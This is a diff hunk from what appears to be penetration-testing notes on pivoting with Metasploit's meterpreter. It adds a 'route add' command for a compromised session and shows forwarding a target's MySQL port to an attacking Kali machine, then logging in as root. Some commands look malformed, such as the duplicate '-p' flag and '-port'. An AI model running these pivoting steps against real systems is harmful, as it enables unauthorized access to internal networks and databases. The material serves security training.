@@ -1128,7 +1128,7 @@ Below is using metasploit meterpreter
 # adding local port 8003 to mysql port (3306) on attacking machine
 # on target in meterpreter shell
 meterpreter > portfwd add -l 8003 -p 3306 -p 172.17.0.2
-
+route add 172.17.0.0/24 1
 
 # On kali in a new window
 mysql -h 127.0.0.1 -port=8003 -u root -p
